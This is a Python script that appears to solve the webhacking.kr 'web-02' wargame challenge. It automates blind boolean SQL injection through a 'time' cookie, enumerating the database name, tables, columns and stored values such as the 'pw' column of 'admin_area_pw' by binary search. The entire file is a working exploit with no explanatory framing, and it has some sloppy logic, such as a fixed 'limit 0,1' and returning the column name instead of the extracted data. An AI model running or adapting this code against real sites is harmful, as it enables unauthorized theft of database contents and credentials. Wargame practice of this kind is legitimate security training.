from re import L
import requests
from tqdm import tqdm

url = "https://webhacking.kr/challenge/web-02/"
cookies = {}
TRUE_FLAG = '<!--\n2070-01-01 09:00:01\n-->'
FALSE_FLAG = '<!--\n2070-01-01 09:00:00\n-->'


#데이터 베이스 이름의 길이
def get_database_length():
    for i in range(30):
        payload = 'length(database()) = {}'.format(i)
        cookies['time'] = payload 
        response = requests.get("https://webhacking.kr/challenge/web-02/",cookies=cookies)
        if(TRUE_FLAG in response.text):
            print("find the length of database : ",i)
            return i

# 데이터베이스 이름
def get_database_name():
    database_length = get_database_length()
    database = ''
    for i in tqdm(range(1,database_length+1),desc="get database_name"):
        start,end = 1,127
        while True:
            search = int((start + end )/2)
            payload = 'ascii(substr(database(),{},1)) < {}'.format(i,search)
            cookies['time'] = payload
            response = requests.get(url,cookies=cookies)
            if(TRUE_FLAG in response.text):
                end = search
            else:
                start = search
            if(start == end):
                database += chr(start)
                break
            if(start == end -1 ):
                payload = 'ascii(substr(database(),{},1)) = {}'.format(i,start)
                cookies['time'] = payload
                response = requests.get(url,cookies=cookies)
                if(TRUE_FLAG in response.text):
                    database +=chr(start)
                    break
                else:
                    database +=chr(end)
                    break
    print("find the database name : ",database)
    return database
# chall2 DB에 테이블 몇개 있는지
def get_number_of_tables(database):
    for i in range(10):
        payload = "(select count(*) from information_schema.tables where table_schema='{}') = {}".format(database,i)
        cookies['time'] = payload
        response = requests.get(url,cookies=cookies)
        if(TRUE_FLAG in response.text):
            print("number_of_tables : ",i)
            return i

def get_table_length(index):
    i = 0
    while True:
        i+=1
        payload=" (select length(table_name) from information_schema.tables where table_schema = 'chall2' limit {},1) = {}".format(index,i)
        cookies['time'] = payload
        response = requests.get(url,cookies=cookies)
        if (TRUE_FLAG in response.text):
            return i

def get_table_name(table_index):
    table_name = ''
    length = get_table_length(table_index)
    for i in tqdm(range(1,length+1),desc="get table_name"):
        start,end = 1,127
        while True:
            search = int((start + end)/2)
            payload = "(select ascii(substr(table_name,{},1)) from information_schema.tables where table_schema='chall2' limit 0,1) < {}".format(i,search)
            cookies['time'] = payload
            response = requests.get(url,cookies = cookies)
            result = response.text[23:24]
            if(result == '1'):
                end = search
            else:
                start = search

            if(start == end):
                table_name += chr(start)
                break
            if(start == end-1):
                payload = "(select ascii(substr(table_name,{},1)) from information_schema.tables where table_schema='chall2' limit 0,1) = {}".format(i,start)
                cookies['time'] = payload 
                response = requests.get(url,cookies=cookies)
                result = response.text[23:24]
                if(result == '1'):
                    table_name +=chr(start)
                    break
                else:
                    table_name +=chr(end)
                    break
    return table_name

# 컬럼 이름 갯수는 한개
def get_number_of_columns(table_name):
    for i in range(10):
        payload = "(select count(column_name) from information_schema.columns where table_name='{}') = {}".format(table_name,i)
        cookies['time'] = payload
        response = requests.get(url,cookies=cookies)
        if(TRUE_FLAG in response.text):
            print("number of columns :",i)
            return i

def get_column_length(table_name,column_index):
    for i in range(10):
        payload = "(select length(column_name) from information_schema.columns where table_name='{}' limit {},1) = {}".format(table_name,column_index,i)
        cookies['time'] = payload
        response = requests.get(url,cookies=cookies)
        if(TRUE_FLAG in response.text):
            print("table : {}, column_index : {} -> column_length : {}".format(table_name,column_index,i))
            return i



def get_column_name(table_name,column_index):
    column_length = get_column_length(table_name,column_index)
    column_name = ''
    for i in tqdm(range(1,column_length+1),desc="get column_name"):
        start,end = 1,127
        while True:
            search = int((start + end)/2)
            payload = "(select ascii(substr(column_name,{},1)) from information_schema.columns where table_name='{}' limit {},1) < {}".format(i,table_name,column_index,search)
            cookies['time'] = payload
            response = requests.get(url,cookies=cookies)
            if(TRUE_FLAG in response.text):
                end = search
            else:
                start = search

            if(end == start):
                column_name +=chr(start)
                break
            if(start == end-1):
                payload = "(select ascii(substr(column_name,{},1)) from information_schema.columns where table_name='{}' limit {},1) = {}".format(i,table_name,column_index,start)
                cookies['time'] = payload
                response = requests.get(url,cookies=cookies)
                if(TRUE_FLAG in response.text):
                    column_name +=chr(start)
                    break
                else:
                    column_name +=chr(end)
                    break
    print("table : {}, column_index : {} -> column_name : {}".format(table_name,column_index,column_name))
    return column_name


def get_number_of_data(table_name):
    for i in range(10):
        payload = "(select count(*) from {} ) = {}".format(table_name,i)
        cookies['time'] = payload
        response = requests.get(url,cookies=cookies)
        if(TRUE_FLAG in response.text):
            print("Table : {}, data count : {}".format(table_name,i))
            return i

column_name = 'pw'
table_name = 'admin_area_pw'
data_index = 0

def get_data_length(table_name,column_name,data_index):
    for i in range(30):
        payload = "(select length({}) from {} limit {},1) = {}".format(column_name,table_name,data_index,i)
        cookies['time'] = payload
        response = requests.get(url,cookies=cookies)
        if(TRUE_FLAG in response.text):
            print("table : {}, column_name : {} -> data{}_length : {}".format(table_name,column_name,data_index,i))
            return i


def get_data(table_name,column_name,data_index):
    data_length = get_data_length(table_name,column_name,data_index)
    data = ''
    for i in tqdm(range(1,data_length+1),desc="get data"):
        start,end = 1,127
        while True:
            search = int((start + end)/2)
            payload = "(select ascii(substr({},{},1)) from {} limit {},1) < {} ".format(column_name, i,table_name,data_index,search)
            cookies['time'] = payload
            response = requests.get(url,cookies=cookies)
            if(TRUE_FLAG in response.text):
                end = search
            else:
                start = search

            if(end == start):
                data +=chr(start)
                break
            if(start == end-1):
                payload = "(select ascii(substr({},{},1)) from {} limit {},1) = {} ".format(column_name, i,table_name,data_index,start)
                cookies['time'] = payload
                response = requests.get(url,cookies=cookies)
                if(TRUE_FLAG in response.text):
                    data +=chr(start)
                    break
                else:
                    data +=chr(end)
                    break
    print("table : {}, column_name : {} -> data : {}".format(table_name,column_name,data))
    return column_name

def main():
    database = get_database_name()
    number_of_tables = get_number_of_tables(database)
    for table_index in range(number_of_tables):
        table_name = get_table_name(table_index)
        number_of_column = get_number_of_columns(table_name)
        number_of_data = get_number_of_data(table_name)
        for column_index in range(number_of_column):
            column_name = get_column_name(table_name,column_index)
            for data_index in range(number_of_data):
                data = get_data(table_name,column_name,data_index)
                print(table_name,column_name,data)



if __name__ == '__main__':
    main()

